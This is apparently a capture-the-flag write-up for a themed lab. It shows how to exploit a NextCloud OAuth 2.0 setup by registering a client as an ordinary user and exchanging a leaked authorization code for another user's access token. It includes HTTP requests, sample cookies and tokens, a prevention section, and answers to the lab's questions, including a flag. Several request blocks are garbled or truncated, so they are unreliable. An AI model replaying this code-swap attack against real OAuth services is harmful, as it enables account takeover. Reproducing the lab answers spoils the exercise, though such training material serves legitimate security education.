> As a former king, Popiel brings a wealth of political experience to the team. He is a shrewd strategist who is well-versed in the ways of diplomacy and negotiation. Popiel's expertise is particularly valuable when it comes to navigating the complicated relationships between the Midsummer Corp and the various factions that are interested in the fern flower.

## Exploitation

### Briefing

> To succeed in your final hack, you need to become familiar with the OAuth 2.0 authorization framework. This standard allows a user to grant a third-party application access to the user's protected resources. The best part is that the application does not know the user's credentials. 
>
> **How does OAuth work?** </br> 
> To get started and understand basic terminology, watch the OAuth portion of the [video](https://www.youtube.com/watch?v=t18YB3xDfXI). 
>
> As you already know, there are 4 roles in the OAuth flow:
> - Resource Owner, 
> - Resource Server, 
> - Client, 
> - Authorization Server. 
>
> Flows have different types, called grant types. The most popular is the Authorization Code flow. You can find the nitty-gritty details, including the structure of HTTP requests, [in the blog post](https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type). 
>
> Before any flow can take place, a Client and an Authorization Server must establish a trust relationship. This step is called registration, and as a result, a client receives an identifier, called client_id, and a secret value, called client_secret. 
>
> **Common OAuth issues** </br>
> <ins>1. Missing recommended properties of an authorization code</ins> </br>
> The purpose of the authorization code is to exchange it for an access token. Current guidelines list the following preferred properties:
> - The authorization code should be a one-time-use. 
> - The authorization code should expire shortly (3-5 minutes is best) after it is issued by the Authorization Server. 
> - The authorization code should be bound to a single Client.
> - The authorization code should be transmitted securely over a TLS connection. 
>
> These properties help ensure the security of the Authorization Code Flow by minimizing the window of opportunity for an attacker to intercept and misuse the authorization code. Unfortunately, many implementations do not follow them. 
>
> <ins>2. Open registration of new OAuth clients</ins> </br> 
> Registration of new OAuth Clients should be restricted. This ensures that only legitimate and trustworthy applications are granted access to user data. With a new Client verification process in place, it will be more difficult for an attacker to trick the victim into agreeing to access their data.  

**Prerequisites**: Access to `twardowski` account. </br>
**Your objective**: You should already be in possession of a leaked authorization code. It is a result of an OAuth flow initiated by one of the Popiel's advisory applications. Your task is to exchange it for an access token and access a former king's resources. Best of luck!

### Reconnaissance

> **Note** </br>
I won't be explain how OAuth 2.0 work in detail but it's crucial to have knowledge about it in order to understand this attack. I refer you to two linked resources inside the Briefing in order to better understand the flow and logic behind OAuth 2.0.

Briefing already tells us how we are supposed to hack our way into the system - by exchanging the leaked authorization code for a token. For this to work, the server must not check which authorization code is tied to what application, giving as an Attack Vector already!

Let's start by exploring Twardowski's files. There are two that should immediately grab out attention:
- [`authorization_code.txt`](./authorization_code.txt) containing a leaked authorization code, apparently related to Popiel. That's a huge find already!
- [`supportticket_draft.txt`](./supportticket_draft.txt) containing a draft of a message explaining the problem with registration of Twardowski's client.

Closer look at the second file reveals more interesting details.

First of all, Twardowski tried to send a request to `/apps/oauth2/clients` endpoint. Using the provided source code we can easily find all the remaining routes related to OAuth 2.0 inside `/apps/oauth2/appinfo/routes.php` file:

```PHP
return [
	'routes' => [
		['name' => 'Settings#addClient', 'url' => '/clients', 'verb' => 'POST'],
		['name' => 'Settings#deleteClient', 'url' => '/clients/{id}', 'verb' => 'DELETE'],
		['name' => 'LoginRedirector#authorize', 'url' => '/authorize', 'verb' => 'GET'],
		['name' => 'OauthApi#getToken', 'url' => '/api/v1/token', 'verb' => 'POST' ],
	],
];
```

> **Note** </br>
> Routes in this file are registered under `/apps/oauth2` prefix, meaning `/clients` in reality maps to `/apps/oauth2/clients` etc.

Second of all, Twardowski was using **admin credentials** to register theirs new client. Is might be possible to use those to gain access to everything the web app has to offer, admin is an admin after all. Furthermore, by navigating to `/u/admin` we can check that `admin` user in fact exists in the system. For all the previous stages, Briefing exclusively mentioned what account we are trying to break into, which isn't the case for this one.

![Admin's profile](./media/admin_profile.png)

All of these further reinforce the idea that we might gain access to Popiel's account through `admin` - we will give it a try later. For now, let's try to recreate the request that Twardowski had some troubles with:

<details>
<summary>View HTTP Request</summary>

```HTTP
POST /apps/oauth2/clients HTTP/1.1
Host: 10.10.181.99
Content-Type: application/json
Content-Length: 86
Cookie: ocqpfobax3l0=ea40d3c44aebc7c3d2d060ce0c74f7c4; oc_sessionPassphrase=mzJr4dxugNOXA34YgaivUEgs8P4p%2BEju7qBoC87qZ9S4Cu2lUGAo50U3HiuEw3CAfGgusiTSBSMA8s03rgJY0PcVgGbGJEbyNKV3EdvhxL5lXP83qw8xjBQM6qTj083j; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=admin; nc_token=RhnpFe88vZTezlB9J0FmEj9S4lrX%2FLyl; nc_session_id=ea40d3c34aebb7c3d2d060ce0c74f7c4

{"name":"alchemy-mixer-ng","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}
```
</details>

```JSON
{
    "message": "Current user is not logged in"
}
```

There goes the plan to use Admin's cookies to make our way in - the user is logged out server side and there's nothing we can do about it. What happens if we just removed those cookies and send the request again?

<details>
<summary>View HTTP Request</summary>

```HTTP
POST /apps/oauth2/clients HTTP/1.1
Host: 10.10.181.99
Content-Type: application/json
Content-Length: 86

{"name":"alchemy-mixer-ng","redirectUri":"https://alchemy-mixer-ng.ctf/auth/callback"}
```
</details>

```JSON
{
    "message": "Current user is not logged in"
}
```

We get exactly the same error message. If we cannot access this endpoint as an admin and anonymous user, maybe being logged onto one of the other accounts will do the trick?

Opening the `/apps/oauth2/lib/Controller/SettingsController.php` Controller (one responsible for handling POST requests on `/apps/oauth2/clients`) in the source code confirms that we can use any of the valid accounts to register an OAuth2 client:

```PHP
/**
 * @NoAdminRequired
 */
public function addClient( /* (...) */ ): JSONResponse { /* (...) */ }
```

The `@NoAdminRequired` annotation means that to access this endpoint you don't need admin privilages. You still need to be a valid user hovewer, as this endpoint doesn't contain the `@PublicPage` annotation.

> **Note** </br>
All the annotations are implemented and explained in `/lib/private/AppFramework/Middleware/Security/SecurityMiddleware.php`

All those pieces of information should be enough to execute the attack.

### Attack Vector

> **Note** </br>
Technically speaking, in this case we are dealing with a higher dimensional Attack Vector, since there are **TWO** things that went wrong :).

Authorization codes not being bound to a single Client.

Open registration of new OAuth Clients.

### Execution

Let's start by making sure we have appropriate cookies inside Postman. In my case, I have decided to use Twardowski's account to carry out the attack.

We will begin by sending the same request to register a new client, only difference being we are logged in as Twardowski this time:

```
</details>

```JSON
{
    "message": "CSRF check failed"
}
```

We are hit with an error, but we already encounted it before when trying to hack into [Boruta's](../04_Boruta/README.md) account - all we need to do is to add a `RequestToken` header with a valid value. We could simply copy the token from the previous request or we can search the `/core/routes.php` to discover an endpoint, which provides us with valid CSRF tokens:

```PHP
$application->registerRoutes($this, [
	'routes' => [
        /* (...) */
        ['name' => 'CSRFToken#index', 'url' => '/csrftoken', 'verb' => 'GET'],
        /* (...) */
    ]
]);
```

> **Note** </br>
> This endpoint is also periodically called every 12 minutes from any page within the web application.

With CSRF token included in the request, let's send it one more time:

}
```

Just like that, we successfully register an OAuth 2.0 Client! Now we can use it to exchance the leaked authorization code for a token.

To do this, we first much find an endpoint that's responsible for handing those tokens out. Thankfully, we already discovered it: `/apps/oauth2/api/v1/token`.

Let's create a proper request now. For this, we need this to [provide a few parameters](https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type#exchange-the-authorization-code-for-an-access-token):
- `grant_type=authorization_code` to let the server know we want to exchange the code for a token
- `code` being the leaked authorization code
- `redirect_uri`, `client_id`, `client_secret` having the same values as our newly added Client

With that out of the way, we can finally craft and send the request:

<details>
<summary>View HTTP Request</summary>

```HTTP

Host: 10.10.181.99
Content-Type: application/json

    "redirect_uri": "https://alchemy-mixer-ng.ctf/auth/callback"
}
```
</details>

```JSON
{
    "access_token": "q4HyexEnRcUn51shio4kHrS1KCb8NFFNk2efW6BNGYMeIdFXLv9TlkQFBG10eQ2Q4wJ7qDyS",

    "user_id": "popiel"
}
```

VoilÃ ! We successfully exchanged the leaked authorization code for a pair of tokens. We are only interested in the `access_token` though, as we have exactly 1 hour to grab what we need before it expires - that's a lot of time.

To access Popiel's files, we can once again use ModHeader to send a proper `Authorization` header with every request within the web browser:

```HTTP
Authorization: Bearer q4HyexEnRcUn51shio4kHrS1KCb8NFFNk2efW6BNGYMeIdFXLv9TlkQFBG10eQ2Q4wJ7qDyS
```

![ModHeader with Authorization header added](./media/modheader.png)

Finally, after all of this, we gain access to Former King's resources.

## Prevention

First, when implementing an OAuth 2.0 workflow always ensure that authorization codes are bound to a single Client only. This prevents the code being used for unintended purposes even if it get's accidentally leaked.

To up the security even more, authorization codes should be short-lived, one-time-use only and bound to a single Client.

Secondly, OAuth Client creation should only be allowed for trusted users. It is not necessary to restrict this ability to admin only, but there shouldn't be an use case in which every single user can create their own Client.

## Tasks

### The NextCloud application plays two OAuth roles at once. Which ones?

`Authorization Server, Resource Server`

Straight from the Briefing, although requires a bit of logical thinking this time.

### What value of the response_type parameter indicates that an application is starting the authorization code flow?

`code`

Straight from the OAuth 2.0 protocol specification, can also easily be found in [various blog posts](https://developer.okta.com/blog/2018/04/10/oauth-authorization-code-grant-type#get-the-users-permission).

### During registration, each client receives a unique pair of client_id and client_secret. (Y/N)

`Y`

`client_id` and `client_secret` uniquely identify a single Client, thus they must be unique as well.

### What endpoint you should use to exchange the OAuth code for a token?

`/apps/oauth2/api/v1/token`

Found in `/apps/oauth2/appinfo/routes.php` file registering routes related to OAuth 2.0.

### What is the content of the Fern_flower_ritual_shard6.txt file in Popiel's account?

`Midsummer_Corp{Spr1nkle_wat3r_fr0m_a_s@cr3d_spr1ng_0n_th3_fern}`

Found in the account's files.
